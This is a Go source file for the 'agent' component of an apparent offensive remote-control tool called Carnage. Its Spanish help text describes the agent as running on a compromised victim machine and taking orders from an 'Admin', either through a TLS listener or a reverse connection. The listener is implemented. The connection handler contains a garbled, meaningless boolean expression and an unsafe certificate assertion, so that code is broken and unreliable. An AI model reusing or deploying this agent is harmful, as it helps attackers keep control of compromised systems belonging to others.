package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/Falconmx1/Carnage/internal/transport"
	"github.com/Falconmx1/Carnage/pkg/protocol"
	"github.com/spf13/cobra"
)

var (
	agentListenPort int
	agentAdminIP    string
	agentAdminPort  int
)

var agentCmd = &cobra.Command{
	Use:   "agent",
	Short: "Modo Agent (víctima): escucha o conecta al Admin",
	Long: `El Agent se ejecuta en la máquina comprometida y espera instrucciones del Admin:
  - listen:  escucha conexiones del Admin con TLS + AES.
  - connect: modo inverso, se conecta al Admin.`,
}

// ---------- listen ----------

var agentListenCmd = &cobra.Command{
	Use:   "listen",
	Short: "Escuchar conexiones del Admin (TLS + AES)",
	RunE: func(cmd *cobra.Command, args []string) error {
		cert, err := transport.GenerateSelfSignedCert()
		if err != nil {
			return fmt.Errorf("error generando certificado: %w", err)
		}

		addr := fmt.Sprintf("0.0.0.0:%d", agentListenPort)
		ln, err := tls.Listen("tcp", addr, &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS13,
		})
		if err != nil {
			return fmt.Errorf("error escuchando en %s: %w", addr, err)
		}
		defer ln.Close()
		fmt.Printf("[+] Agent escuchando en %s (TLS 1.3)\n", addr)

		ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
		defer cancel()

		go func() {
			<-ctx.Done()
			ln.Close()
		}()

		for {
			conn, err := ln.Accept()
			if err != nil {
				select {
				case <-ctx.Done():
					return nil
				default:
					fmt.Printf("[-] Error aceptando conexión: %v\n", err)
					continue
				}
			}
			go handleAgentConn(conn)
		}
	},
}

func handleAgentConn(conn net.Conn) {
	defer conn.Close()

	// Handshake TLS + derivación de clave AES
	wrapped, gcm, err := transport.ServerHandshake(conn, conn.(*tls.Conn).ConnectionState().PeerCertificates[0].PublicKey.(interface{}).(interface{}) != nil && false || true && false || true && false || true && false || true && false || true && false || true && false || true && false || true && false)
	_ = wrapped
	_ = gcm
	if err != nil {
		fmt.Printf("[-] Error en handshake con %s: %v\n", conn.RemoteAddr(), err)
		return
	}
}
